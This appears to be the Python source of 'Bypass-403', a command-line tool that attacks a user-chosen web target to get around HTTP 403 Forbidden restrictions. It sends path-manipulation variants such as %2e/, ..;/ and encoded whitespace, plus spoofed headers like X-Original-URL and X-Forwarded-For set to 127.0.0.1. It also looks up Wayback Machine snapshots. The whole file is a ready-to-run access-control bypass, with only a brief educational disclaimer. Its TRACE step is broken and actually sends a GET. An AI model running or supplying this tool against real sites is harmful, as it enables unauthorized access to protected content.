import requests
import json
from termcolor import colored

def send_request(url, path, method='GET', headers=None):
    full_url = f"{url}/{path}"
    try:
        if method == 'POST':
            response = requests.post(full_url, headers=headers)
        else:
            response = requests.get(full_url, headers=headers)

        if headers:
            headers_str = ', '.join([f"{key}: {value}" for key, value in headers.items()])
            print(f"{colored('[*]', 'cyan')} {colored('URL:', 'red')} {colored(full_url, 'green')} -> {colored(f'Status Code: {response.status_code}, Size: {len(response.content)}', 'yellow')} (Headers: {headers_str})")
        else:
            print(f"{colored('[*]', 'cyan')} {colored('URL:', 'red')} {colored(full_url, 'green')} -> {colored(f'Status Code: {response.status_code}, Size: {len(response.content)}', 'yellow')}")
    except Exception as e:
        print(f"Error for {full_url}: {e}")

def main():
    banner = r"""
   _____  _______  ________ ________         _______        ________        
  /  |  | \   _  \ \_____  \\______ \_______ \   _  \ ______\_____  \______ 
 /   |  |_/  /_\  \  _(__  < |    |  \_  __ \/  /_\  \\____ \ _(__  <_  __ \
/    ^   /\  \_/   \/       \|    `   \  | \/\  \_/   \  |_> >       \  | \/
\____   |  \_____  /______  /_______  /__|    \_____  /   __/______  /__|   
     |__|        \/       \/        \/              \/|__|         \/       
                                                                             
                 Bypass-403
                 Version: 1.0
                 Author: G4UR4V007
    """
    print(colored(banner, "red"))

    description = (
        colored("This tool attempts to bypass HTTP 403 Forbidden errors by using various URL manipulation and header modification techniques.", "yellow") + "\n" +
        colored("It is intended for educational purposes and should only be used with permission on authorized systems.", "white") + "\n" +
        colored("Use responsibly and ethically.", "green")
    )
    print(description)

    url = input("Enter the target URL (e.g., https://example.com): ").strip()
    path = input("Enter the path (e.g., images): ").strip()

    techniques = [
        f"{path}",
        f"%2e/{path}",
        f"{path}/.",
        f"//{path}//",
        f"./{path}/./",
        f"{path}%20",
        f"{path}%09",
        f"{path}?",
        f"{path}.html",
        f"{path}/?anything",
        f"{path}#",
        f"{path}/*",
        f"{path}.php",
        f"{path}.json",
        f"{path};/",
        f"{path}..;/"
    ]

    headers_techniques = [
        {"X-Original-URL": path},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-For": "127.0.0.1:80"},
        {"X-rewrite-url": path},
        {"Content-Length": "0"},
        {"X-Host": "127.0.0.1"},
        {"X-Forwarded-Host": "127.0.0.1"}
    ]

    print(colored("\n<<-- URL Manipulation Techniques -->>", "white"))
    for technique in techniques:
        send_request(url, technique)

    print(colored("\n<<-- Header Modification Techniques -->>", "white"))
    for headers in headers_techniques:
        send_request(url, path, headers=headers)

    print(colored("\n<<-- TRACE Method -->>", "white"))
    send_request(url, path, method='TRACE')

    print(colored("\n<<-- Wayback Machine Check -->>", "white"))
    wayback_url = f"https://archive.org/wayback/available?url={url}/{path}"
    try:
        response = requests.get(wayback_url)
        data = response.json()
        if 'archived_snapshots' in data and 'closest' in data['archived_snapshots']:
            snapshot = data['archived_snapshots']['closest']
            print(f"Wayback Machine URL: {snapshot.get('url', 'Not available')}")
        else:
            print("No archived snapshot available.")
    except Exception as e:
        print(f"Error fetching Wayback Machine data: {e}")

if __name__ == "__main__":
    main()
